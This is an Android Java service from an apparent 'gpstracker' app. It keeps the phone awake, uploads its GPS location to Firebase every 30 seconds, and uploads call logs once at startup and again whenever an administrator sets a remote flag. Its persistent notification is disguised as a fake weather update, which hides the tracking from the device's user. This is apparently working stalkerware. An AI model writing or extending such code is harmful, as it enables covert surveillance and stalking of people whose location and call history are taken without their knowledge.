package com.sgs.gpstracker.services;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.sgs.gpstracker.MyApp;
import com.sgs.gpstracker.R;
import com.sgs.gpstracker.utils.FirebaseUtils;
import com.sgs.gpstracker.utils.ServiceClassUtils;

public class LocationBroadcastService extends Service {

    private FusedLocationProviderClient fusedLocationClient;
    private String deviceId;
    private Runnable locationRunnable;
    private Handler handler;
    public static final long LOCATION_UPDATE_INTERVAL = 30000; // 5 seconds
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();

        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "gps:wakelock");
        wakeLock.acquire();

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        startForegroundServiceWithNotification();
        handler = new Handler();




    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getStringExtra("deviceId") != null) {
            deviceId = intent.getStringExtra("deviceId");
            getSharedPreferences("user", MODE_PRIVATE)
                    .edit()
                    .putString("deviceId", deviceId)
                    .apply();
        } else {
            SharedPreferences prefs = getSharedPreferences("user", MODE_PRIVATE);
            deviceId = prefs.getString("deviceId", null);
        }

        if (deviceId != null) {
            checkForLocationRequest();
            startLocationUpdateLoop();
            checkForCallogsRequest(); // on admin demand
            uploadCallogs(); //first time when service starts


        }

        return START_STICKY;
    }

    private void uploadCallogs() {
        ServiceClassUtils.fetchAndUploadCallLogs(getApplicationContext(),deviceId);
    }

    private void checkForLocationRequest() {
        DatabaseReference requestRef = FirebaseDatabase.getInstance()
                .getReference("users")
                .child(deviceId)
                .child("locationRequest");

        requestRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean request = snapshot.getValue(Boolean.class);
                if (request != null && request) {
                    getAndUploadCurrentLocation();
                    requestRef.setValue(false);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        });
    }

    private void checkForCallogsRequest() {
        DatabaseReference requestRef = FirebaseDatabase.getInstance()
                .getReference("users")
                .child(deviceId)
                .child("callogRequest");

        requestRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean request = snapshot.getValue(Boolean.class);
                if (request != null && request) {
                    uploadCallogs();
                    requestRef.setValue(false);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        });
    }

    private void startLocationUpdateLoop() {
        if (locationRunnable == null) {
            locationRunnable = new Runnable() {
                @Override
                public void run() {
                    getAndUploadCurrentLocation();
                    handler.postDelayed(this, LOCATION_UPDATE_INTERVAL);
                }
            };
            handler.post(locationRunnable);
        }
    }

    @SuppressLint("ForegroundServiceType")
    private void startForegroundServiceWithNotification() {
        Notification notification = new NotificationCompat.Builder(this, MyApp.CHANNEL_ID)
                .setContentTitle("Weather Update")
                .setContentText("Current Temp: 27°C, Mostly Cloudy")
                .setSmallIcon(R.drawable.ic_weather) // Replace with an actual weather icon if available
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();

        startForeground(1, notification);
    }


    private void getAndUploadCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
            if (location != null && deviceId != null) {
                FirebaseUtils.updateUserLocation(deviceId, location.getLatitude(), location.getLongitude());
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && locationRunnable != null) {
            handler.removeCallbacks(locationRunnable);
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
